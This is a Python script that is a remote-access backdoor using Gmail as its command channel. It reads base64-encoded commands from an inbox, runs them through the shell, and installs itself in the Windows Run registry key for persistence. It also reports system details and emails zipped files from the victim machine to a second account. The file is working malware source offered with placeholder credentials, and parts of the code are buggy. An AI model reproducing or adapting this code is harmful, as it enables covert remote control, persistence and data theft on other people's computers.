import base64
import imaplib
import email
import platform
import subprocess
import smtplib
import time
import os
import zipfile
from email.mime.application import MIMEApplication
from email.mime.multipart import  MIMEMultipart
from email.mime.text import MIMEText
class Mainserver:
    def __init__(self):
        try:
            imapserver = "imap.gmail.com"
            username = "your_2nd_gmail@gmail.com"
            password = "your2ndgmailapp password"
            getting = "Your_1st_gmail@gmail.com"
            smtpserver = "smtp.gmail.com"
            MESSAGE_BODY = 'This is an attachement'
            while True:
                try:
                    message = imaplib.IMAP4_SSL(imapserver)
                    message.login(username, password)
                    message.select("inbox")
                    _, data = message.search(None, "UNSEEN")
                    for x in data[0].split():
                        _, msg = message.fetch(x, '(RFC822)')
                        _, g = msg[0]
                        data_email = email.message_from_bytes(g)
                        for m in data_email.walk():
                            if m.get_content_type() == "text/plain":
                                body = m.get_payload(decode=True)
                                cm = body.decode("utf-8")
                                base64_bytes = cm.encode('ascii')
                                message_bytes = base64.b64decode(base64_bytes)
                                x = cm
                                clock = str(x[1])
                                def sendcm(result):
                                    server = smtplib.SMTP(smtpserver, 587)
                                    server.starttls()
                                    message_bytes = result.encode('ascii')
                                    base64_bytes = base64.b64encode(message_bytes)
                                    base64_message = base64_bytes.decode('ascii')
                                    server.login(username, password)
                                    server.sendmail(username, getting, base64_message)
                                    server.quit()
                                def changedir(path):
                                    try:
                                        os.chdir(path)
                                        result = (clock + "\n\n" + "[+] changing direcotry to :- " + path)
                                        sendcm(result)
                                    except Exception:
                                        e="error occured"
                                        msg2=clock+"\n\n"+e
                                        sendcm(msg2)
                                        print(e)

                                def command_r(command):
                                    try:
                                     if "persist" in command:
                                      print("trying to persist myself")
                                      path=os.path.abspath("first.exe")
                                      c="reg add HKCU\SoftWare\Microsoft\Windows\CurrentVersion\Run /v document /t REG_SZ /d "+ path
                                      r = subprocess.check_output(c, shell=True)
                                      msg1 = clock + "\n\n"+ "program success persist"
                                      print(msg1)
                                      sendcm(msg1)
                                     elif "info" in command:
                                         my_system = platform.uname()
                                         sendcm(f"System: {my_system.system}\nNode Name: {my_system.node}\nRelease: {my_system.release}\nVersion: {my_system.version}\nMachine: {my_system.machine}")
                                     else:
                                      r = subprocess.check_output(command, shell=True)
                                      msg0=r.decode("utf-8")
                                      msg1=clock+str(msg0)
                                      sendcm(msg1)
                                    except Exception:
                                        e="error occured"
                                        msg2=clock+"\n\n"+e
                                        sendcm(msg2)
                                        print(e)
                                def attachement():
                                    filename=j
                                    a = filename[1].strip()
                                    new = a.split(".")
                                    rename=str(new[0])+".zip"
                                    zip_file=zipfile.ZipFile(rename, 'w')
                                    zip_file.write(filename, compress_type=zip_file.compression)
                                    zip_file.close()
                                    time.sleep(3)
                                    PATH_TO_ZIP_FILE = rename
                                    msg = MIMEMultipart()
                                    body_part = MIMEText(MESSAGE_BODY, 'plain')
                                    msg['From'] = username
                                    msg['To'] = getting
                                    msg.attach(body_part)
                                    with open(PATH_TO_ZIP_FILE, 'rb') as attachement:
                                        msg.attach(MIMEApplication(attachement.read(), Name='filename.zip'))
                                    server = smtplib.SMTP(smtpserver, 587)
                                    server.connect(smtpserver, 587)
                                    server.ehlo()
                                    server.starttls()
                                    server.ehlo()
                                    server.login(msg['From'], password)
                                    text = msg.as_string()
                                    server.sendmail(msg['From'], msg['To'], text)
                                    server.quit()
                                    remove_upload(rename)

                            def remove_upload(rename):
                                os.remove(rename)
                                print("file is deleted")

                        c = message_bytes.decode('ascii')
                        command = c.split(" ")
                        if command[0] == "cd":
                            changedir(command[1])
                        elif command[0] == "download":
                            global j
                            j = command[1]
                            attachement()
                        else:
                            command_r(command)
                    del clock
                    time.sleep(1)
                except Exception:
                 time.sleep(2)
        except Exception:
            print("Something bad happened")
        finally:
            Mainserver.__init__()
Mainserver()
